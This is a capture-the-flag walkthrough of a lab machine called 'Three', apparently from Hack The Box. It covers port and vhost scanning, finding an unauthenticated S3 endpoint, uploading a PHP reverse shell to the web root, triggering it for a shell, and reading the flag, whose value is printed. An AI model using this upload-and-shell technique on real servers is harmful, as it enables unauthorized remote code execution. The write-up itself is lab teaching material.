# IP
10.129.237.81

## Enumeration 

### NMAP
Found two ports running on the machine
1. **22** - ssh
2. **80** - http
```console
❯ nmap -sC -sV 10.129.237.81 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-12 09:45 IST
Nmap scan report for 10.129.237.81
Host is up (0.29s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Toppers
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.78 seconds
```

### Gobuster 
Nothing interersting found on the gobuster dir
```console
❯ gobuster dir --url http://three.htb   -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,js,txt | tee gobuster.log
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://three.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,js,txt
[+] Timeout:                 10s
===============================================================
2022/10/12 09:46:41 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 11952]
/images               (Status: 301) [Size: 307] [--> http://three.htb/images/]
Progress: 43292 / 882244 (4.91%)
```
On visiting website found that there was an email with domain thetoppers.htb, so added ip and domain to `/etc/hosts` <br />
On seraching for DNS found a s3 bucket
```console
❯ gobuster vhost -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://thetoppers.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/10/12 10:00:33 Starting gobuster in VHOST enumeration mode
===============================================================
Found: s3.thetoppers.htb (Status: 502) [Size: 424]
```
# Website
Nothing interesting found except the domain name of ip in email provided
```console
❯ curl http://thetoppers.htb
<!DOCTYPE html>
<html lang="en">
<head>
<title>The Toppers</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
body {font-family: "Lato", sans-serif}
.mySlides {display: none}
</style>
</head>
<body>

<!--snip-->

  <!-- The Contact Section -->
  <div class="w3-container w3-content w3-padding-64" style="max-width:800px" id="contact">
    <h2 class="w3-wide w3-center">CONTACT</h2>
    <p class="w3-opacity w3-center"><i>Fan? Drop a note!</i></p>
    <div class="w3-row w3-padding-32">
      <div class="w3-col m6 w3-large w3-margin-bottom">
        <i class="fa fa-map-marker" style="width:30px"></i> Chicago, US<br>
        <i class="fa fa-phone" style="width:30px"></i> Phone: +01 343 123 6102<br>
        <i class="fa fa-envelope" style="width:30px"> </i> Email: mail@thetoppers.htb<br><!-------------------email with domain--->
      </div>
      <div class="w3-col m6">
        <form action="/action_page.php" target="_blank">
          <div class="w3-row-padding" style="margin:0 -16px 8px -16px">
            <div class="w3-half">
              <input class="w3-input w3-border" type="text" placeholder="Name" required name="Name">
            </div>
            <div class="w3-half">
              <input class="w3-input w3-border" type="text" placeholder="Email" required name="Email">
            </div>
          </div>
          <input class="w3-input w3-border" type="text" placeholder="Message" required name="Message">
          <button class="w3-button w3-black w3-section w3-right" type="submit">SEND</button>
        </form>
      </div>
    </div>
  </div>

<!-- End Page Content -->
</div>

<!-- Image of location/map -->
<img src="/images/final.jpg" class="w3-image w3-greyscale-min" style="width:100%">

<!-- Footer -->
<footer class="w3-container w3-padding-64 w3-center w3-opacity w3-light-grey w3-xlarge">
  <i class="fa fa-facebook-official w3-hover-opacity"></i>
  <i class="fa fa-instagram w3-hover-opacity"></i>
  <i class="fa fa-snapchat w3-hover-opacity"></i>
  <i class="fa fa-pinterest-p w3-hover-opacity"></i>
  <i class="fa fa-twitter w3-hover-opacity"></i>
  <i class="fa fa-linkedin w3-hover-opacity"></i>

</footer>

<!---snip---->
</body>
</html>
```

# S3 bucket 
The homepage just respnds with json
```console
❯ curl http://s3.thetoppers.htb
{"status": "running"}%
```
On configuring `awscli` with random data because sometimes it does not read the credentials listed all the buckets in this domain.
```console
❯ aws configure
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
❯ aws --endpoint=http://s3.thetoppers.htb s3 ls
2022-10-12 10:06:37 thetoppers.htb
```
There is only one bucket so listed all the files in this bucket.
```console
❯ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2022-10-12 10:06:37          0 .htaccess
2022-10-12 10:06:38      11952 index.php
```
There is a php file in the root bucket it means if we can upload a php reverse shell script and access it directly we can get a reverse shell.
```console
❯ aws --endpoint=http://s3.thetoppers.htb s3 cp php-reverse-shell.php s3://thetoppers.htb
upload: ./php-reverse-shell.php to s3://thetoppers.htb/php-reverse-shell.php
❯ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2022-10-12 10:06:37          0 .htaccess
2022-10-12 10:06:38      11952 index.php
2022-10-12 11:02:38       5493 php-reverse-shell.php

```
Went to (http://thetoppers.htb/php-reverse-shell.php) and got a reverse shell.

# Reverse shell
```console
www-data@three:/home/svc$ find / -name "flag.txt" 2>/dev/null
/var/www/flag.txt
catwww-data@three:/home/svc$ cat /var/www/flag.txt
a980d99281a28d638ac68b9bf9453c2b

```
